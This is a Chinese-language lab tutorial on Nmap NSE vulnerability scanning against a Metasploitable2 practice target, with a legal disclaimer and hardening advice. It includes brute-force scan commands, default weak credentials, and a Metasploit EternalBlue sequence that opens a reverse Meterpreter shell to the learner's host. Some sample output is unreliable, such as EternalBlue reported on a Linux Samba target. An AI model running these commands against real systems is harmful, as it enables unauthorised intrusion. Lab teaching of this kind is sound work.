# 🛡️ 实验12：使用 Nmap 扫描漏洞

> **难度**：⭐⭐⭐⭐ 中级  
> **预计时间**：90分钟  
> **工具**：Nmap + Nmap Scripting Engine (NSE)

---

## 🎯 学习目标

通过本实验，你将学会：

- ✅ 理解 Nmap 脚本引擎（NSE）的工作原理
- ✅ 使用 Nmap 漏洞扫描脚本
- ✅ 检测常见漏洞（SMB、HTTP、SSH 等）
- ✅ 编写和自定义 NSE 脚本
- ✅ 实战：扫描 Metasploitable2 靶机

---

## 📖 背景知识

### 什么是 NSE？

**Nmap Scripting Engine（NSE）** 是 Nmap 的强大扩展功能，使用 **Lua 编程语言**编写脚本，实现高级扫描和漏洞检测。

**NSE 脚本分类：**

| 类别 | 说明 | 示例 |
|------|------|------|
| **auth** | 认证相关 | `ssh-auth-methods`, `http-auth` |
| **broadcast** | 广播探测 | `dhcp-discover`, `dns-service-discovery` |
| **brute** | 暴力破解 | `ssh-brute`, `http-brute` |
| **default** | 默认脚本（`-sC`） | `http-title`, `smb-os-discovery` |
| **discovery** | 信息收集 | `http-headers`, `dns-brute` |
| **dos** | 拒绝服务测试 | `http-slowloris`, `smb-check-vulns` |
| **exploit** | 漏洞利用 | `http-shellshock`, `smb-vuln-ms17-010` |
| **external** | 外部查询 | `whois-domain`, `ip-geolocation` |
| **fuzzer** | 模糊测试 | `http-fuzz`, `dns-fuzz` |
| **intrusive** | 侵入性测试 | `http-sql-injection`, `smtp-vuln-cve2011-1720` |
| **malware** | 恶意软件检测 | `http-malware-host`, `smb-vuln-conficker` |
| **safe** | 安全脚本 | `http-methods`, `ssh-hostkey` |
| **version** | 版本检测增强 | `http-headers`, `ssl-cert` |
| **vuln** | 漏洞检测 | `smb-vuln-ms17-010`, `http-vuln-cve2017-5638` |

### NSE 脚本的工作原理

```
NSE 脚本执行流程：

1. 预扫描阶段（pre-scanning）
   ↓
   脚本初始化、准备
      ↓
2. 扫描阶段（scanning）
   ↓
   发送探测包、接收响应
      ↓
3. 后扫描阶段（post-scanning）
   ↓
   分析结果、输出报告
```

### 常见漏洞类型

| 漏洞类型 | 影响服务 | 危害 |
|---------|---------|------|
| **SMB 漏洞** | SMB (445) | 远程代码执行（如 MS17-010） |
| **HTTP 漏洞** | HTTP/HTTPS (80/443) | SQL 注入、XSS、RCE |
| **SSH 漏洞** | SSH (22) | 认证绕过、信息泄露 |
| **DNS 漏洞** | DNS (53) | 缓存投毒、DDoS |
| **FTP 漏洞** | FTP (21) | 匿名登录、目录遍历 |
| **MySQL 漏洞** | MySQL (3306) | 弱口令、提权 |

### ⚠️ 法律声明

> **本实验仅供学习使用！**
> - 只能对**自己拥有或明确授权的系统**进行漏洞扫描
> - 未经授权扫描他人系统属于**违法行为**
> - 某些 NSE 脚本具有**侵入性**（`intrusive` 类别），可能导致系统崩溃
> - 建议在**隔离的虚拟机环境**中练习（如 Metasploitable2）
> - 使用 `dos` 和 `exploit` 类别脚本前务必谨慎

---

## 🔧 环境要求

### 系统要求

```bash
# 检查 Nmap 版本（需要 7.80+）
nmap --version

# 查看 NSE 脚本目录
ls /usr/share/nmap/scripts/

# 更新 NSE 脚本数据库
sudo nmap --script-updatedb
```

### 准备靶机（必须）

```bash
# 启动 Metasploitable2 靶机（包含大量漏洞）
docker run -d -p 22:22 -p 80:80 -p 443:443 -p 445:445 \
  --name metasploitable tleemcjr/metasploitable2

# 查看靶机 IP
docker inspect metasploitable | grep IPAddress

# 或者，启动 VulnHub 的其他靶机
# - DVWA (Damn Vulnerable Web Application)
# - WebGoat
# - Kioptrix
```

### 验证靶机可达

```bash
# Ping 靶机
ping -c 4 <靶机IP>

# 扫描靶机开放端口
nmap -sS -p 1-1000 <靶机IP>
```

---

## 👨‍💻 实验步骤

### Step 1：了解 NSE 脚本使用

```bash
# 查看所有可用脚本
ls /usr/share/nmap/scripts/ | head -20

# 查看脚本详细信息
nmap --script-help=all

# 查看特定脚本的帮助
nmap --script-help=smb-vuln-ms17-010

# 基本语法
nmap --script <脚本名> <目标>
nmap --script <类别> <目标>
nmap --script "<脚本1>,<脚本2>" <目标>
```

**常用参数：**

| 参数 | 说明 |
|------|------|
| `--script <脚本>` | 指定脚本或类别 |
| `--script-args` | 传递参数给脚本 |
| `--script-updatedb` | 更新脚本数据库 |
| `--script-help` | 查看脚本帮助 |
| `--script-trace` | 显示脚本执行过程 |
| `-sC` | 使用默认脚本（等价于 `--script=default`） |

---

### Step 2：使用默认脚本扫描

```bash
# 使用默认脚本（-sC）
nmap -sC -sV <靶机IP>

# 等价于
nmap --script=default -sV <靶机IP>

# 输出示例：
# Starting Nmap 7.94 ( https://nmap.org )
# Nmap scan report for 192.168.1.100
# PORT     STATE SERVICE     VERSION
# 22/tcp   open  ssh         OpenSSH 4.7p1 (protocol 2.0)
# | ssh-hostkey: 
# |   1024 60:ac:4d:51:b1:cd:85:09:12:3d:8b:1e:78:6f:9d:11 (DSA)
# |_  2048 2b:1e:67:60:dd:84:65:6f:23:9f:6b:29:41:59:98:8e (RSA)
# 80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu))
# | http-methods: 
# |_  Supported Methods: HEAD GET POST OPTIONS
# | http-title: Metasploitable2 - Linux
# |_ Requested resource was server-status
```

---

### Step 3：扫描 SMB 漏洞

```bash
# 检测 SMB 漏洞（如 MS17-010 EternalBlue）
nmap --script smb-vuln* -p 445 <靶机IP>

# 具体脚本：
# - smb-vuln-ms17-010  : EternalBlue 漏洞
# - smb-vuln-ms08-067  : Conficker 漏洞
# - smb-vuln-ms06-025  : RAS RPC 服务漏洞
# - smb-vuln-regsvc-dos : Windows 2000 拒绝服务

# 示例：扫描 EternalBlue
nmap --script smb-vuln-ms17-010 -p 445 <靶机IP>

# 输出示例（存在漏洞）：
# Host script results:
# | smb-vuln-ms17-010: 
# |   VULNERABLE:
# |   Remote Code Execution vulnerability in Microsoft SMBv1 servers
# |   State: VULNERABLE
# |   IDs:  CVE:CVE-2017-0143
# |   Disclosure date: 2017-03-14
# |   Exploit mechanism: SMBv1 request handling in srv2.sys
# |   References:
# |     https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
# |_    https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/smb/smb_ms17_010.rb
```

**其他 SMB 相关脚本：**

```bash
# SMB 信息收集
nmap --script smb-os-discovery,smb-enum-shares \
  -p 445 <靶机IP>

# SMB 暴力破解
nmap --script smb-brute -p 445 <靶机IP>

# SMB 共享枚举
nmap --script smb-enum-shares,smb-enum-users \
  -p 445 <靶机IP>
```

---

### Step 4：扫描 HTTP 漏洞

```bash
# 检测常见 Web 漏洞
nmap --script http-vuln* -p 80,443 <靶机IP>

# 具体脚本：
# - http-vuln-cve2017-5638  : Apache Struts2 RCE
# - http-vuln-cve2014-3704 : Drupalgeddon
# - http-vuln-cve2015-1427 : Elasticsearch RCE
# - http-shellshock         : Shellshock 漏洞

# 示例：检测 Shellshock
nmap --script http-shellshock -p 80,443 <靶机IP>

# 输出示例（存在漏洞）：
# | http-shellshock: 
# |   VULNERABLE:
# |   HTTP Shellshock vulnerability
# |   State: VULNERABLE
# |   IDs:  CVE:CVE-2014-6271
# |   Disclosure date: 2014-09-24
# |   References:
# |     https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
# |_    https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271
```

**HTTP 信息收集脚本：**

```bash
# HTTP 方法检测
nmap --script http-methods -p 80,443 <靶机IP>

# HTTP 标题获取
nmap --script http-title -p 80,443 <靶机IP>

# HTTP 头部信息
nmap --script http-headers -p 80,443 <靶机IP>

# HTTP 目录枚举
nmap --script http-enum -p 80,443 <靶机IP>

# Web 应用指纹识别
nmap --script http-waf-detect,http-waf-fingerprint \
  -p 80,443 <靶机IP>
```

---

### Step 5：扫描 SSH 漏洞

```bash
# SSH 审计脚本
nmap --script ssh* -p 22 <靶机IP>

# 具体脚本：
# - ssh-auth-methods       : 支持的认证方法
# - ssh-brute              : SSH 暴力破解
# - ssh-hostkey            : SSH 主机密钥
# - ssh-publickey-acceptance : 公钥认证测试
# - ssh-run-command        : 执行远程命令

# 示例：检测 SSH 认证方法
nmap --script ssh-auth-methods -p 22 <靶机IP>

# 输出示例：
# PORT   STATE SERVICE
# 22/tcp open  ssh
# | ssh-auth-methods: 
# |   Supported authentication methods:
# |     publickey
# |     password
# |_    keyboard-interactive
```

---

### Step 6：综合漏洞扫描

```bash
# 使用所有漏洞检测脚本（慎用！）
nmap --script "vuln" -sV <靶机IP>

# 使用多个类别
nmap --script "vuln,safe,discovery" -sV <靶机IP>

# 排除危险脚本
nmap --script "vuln and not intrusive" -sV <靶机IP>

# 指定输出格式
nmap --script "vuln" -sV <靶机IP> -oA vuln_scan_results
```

**输出示例（综合扫描）：**

```
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.1.100
Host is up (0.0034s latency).
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 4.7p1
80/tcp   open  http        Apache httpd 2.2.8
443/tcp  open  ssl/http    Apache httpd 2.2.8
445/tcp  open  microsoft-ds Samba smbd 3.X - 4.X

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE: EternalBlue
|   State: VULNERABLE
|   IDs:  CVE:CVE-2017-0143
|_
| http-shellshock: 
|   VULNERABLE: Shellshock
|   State: VULNERABLE
|   IDs:  CVE:CVE-2014-6271
|_

Nmap done: 1 IP address (1 host up) scanned in 45.67 seconds
```

---

### Step 7：实战 - 扫描 Metasploitable2

```bash
# 1. 扫描 Metasploitable2 所有端口
sudo nmap -sS -p 1-65535 <靶机IP>

# 2. 使用默认脚本扫描
sudo nmap -sC -sV <靶机IP>

# 3. 漏洞扫描
sudo nmap --script "vuln" -sV <靶机IP> -p 1-65535

# 4. 针对特定服务深入扫描
# SMB
sudo nmap --script "smb-vuln*" -p 445 <靶机IP>

# HTTP
sudo nmap --script "http-vuln*" -p 80,443 <靶机IP>

# FTP
sudo nmap --script "ftp*" -p 21 <靶机IP>

# MySQL
sudo nmap --script "mysql*" -p 3306 <靶机IP>

# 5. 保存结果
sudo nmap --script "vuln" -sV <靶机IP> -oA metasploitable_vuln
```

**Metasploitable2 常见漏洞：**

| 服务 | 端口 | 漏洞 |
|------|------|------|
| FTP | 21 | vsftpd 2.3.4 后门 |
| SSH | 22 | OpenSSH 4.7p1 弱加密 |
| HTTP | 80 | Apache 2.2.8 多个漏洞 |
| HTTPS | 443 | SSL 弱加密 |
| SMB | 445 | Samba 3.0.20 漏洞 |
| MySQL | 3306 | 弱口令 root/root |
| PostgreSQL | 5432 | 弱口令 postgres/postgres |
| VNC | 5900 | 无密码访问 |

---

## ✅ 验证检查

完成实验后，请确认你能回答以下问题：

- [ ] NSE 脚本有哪些分类？各有什么作用？
- [ ] 如何使用 Nmap 检测 SMB 漏洞（如 EternalBlue）？
- [ ] `--script "vuln"` 和 `-sC` 有什么区别？
- [ ] 如何排除 `intrusive` 类别的脚本？
- [ ] 在 Metasploitable2 上你发现了哪些漏洞？

---

## 💡 进阶挑战

### 挑战1：自定义 NSE 脚本

```lua
-- 创建自定义脚本：/usr/share/nmap/scripts/my-script.nse
description = [[检测目标是否运行特定服务]]

author = "Your Name"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"discovery", "safe"}

portrule = function(host, port)
  return port.protocol == "tcp" and port.state == "open"
end

action = function(host, port)
  local output = stdnse.output_table()
  output.service = port.service
  output.version = port.version.version
  return output
end
```

```bash
# 更新脚本数据库
sudo nmap --script-updatedb

# 使用自定义脚本
nmap --script my-script <靶机IP>
```

### 挑战2：批量漏洞扫描

```bash
# 创建目标列表
cat > targets.txt << EOF
192.168.1.100
192.168.1.101
192.168.1.102
EOF

# 批量扫描
nmap --script "vuln" -sV -iL targets.txt -oA batch_vuln_scan
```

### 挑战3：结合 Metasploit 利用漏洞

```bash
# 启动 Metasploit
msfconsole

# 使用 Nmap 扫描结果
db_import vuln_scan_results.xml

# 搜索可利用的漏洞
search type:exploit platform:linux

# 使用 EternalBlue 漏洞利用
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <靶机IP>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <你的IP>
exploit
```

---

## 🛡️ 防御措施（如何防御 Nmap 漏洞扫描）

### 及时打补丁

| 服务 | 防护措施 |
|------|---------|
| **SMB** | 禁用 SMBv1，安装 MS17-010 补丁 |
| **HTTP** | 及时更新 Web 服务器和应用程序 |
| **SSH** | 使用最新版本，禁用弱加密算法 |
| **FTP** | 使用 SFTP 替代 FTP |
| **数据库** | 设置强密码，限制访问 IP |

### 部署防护系统

| 防护措施 | 说明 |
|---------|------|
| **WAF**（Web 应用防火墙） | 防御 HTTP 漏洞利用 |
| **IPS**（入侵防御系统） | 检测和阻断漏洞利用尝试 |
| **HIDS**（主机入侵检测） | 监控主机上的可疑活动 |
| **补丁管理** | 建立定期补丁更新机制 |

### 配置示例

```bash
# 禁用 SMBv1（Linux - Samba）
sudo nano /etc/samba/smb.conf
# 添加：
[global]
   min protocol = SMB2

# 禁用 SMBv1（Windows）
Set-SmbServerConfiguration -EnableSMB1Protocol $false

# 更新 SSH 配置
sudo nano /etc/ssh/sshd_config
# 添加：
Protocol 2
Ciphers aes128-ctr,aes256-ctr
MACs hmac-sha2-256,hmac-sha2-512

# 配置 WAF（ModSecurity）
sudo apt install -y modsecurity
sudo systemctl restart apache2
```

---

## 📚 参考资源

- [Nmap NSE 官方文档](https://nmap.org/book/nse.html)
- [Nmap 脚本库](https://nmap.org/nsedoc/)
- [NSE 脚本编写教程](https://nmap.org/book/nse-tutorial.html)
- [Metasploitable2 漏洞列表](https://metasploit.help.rapid7.com/docs/using-metasploit/building-your-own-module/)
- [CVE 数据库](https://cve.mitre.org/)

---

## 📝 实验笔记

> 在这里记录你的实验过程、遇到的问题和解决方案：

```
实验日期：
靶机IP：
发现的漏洞：
使用的 NSE 脚本：
漏洞详情（CVE编号）：
修复建议：
遇到的问题：
解决方案：
```

---

*最后更新：2026-05-30*
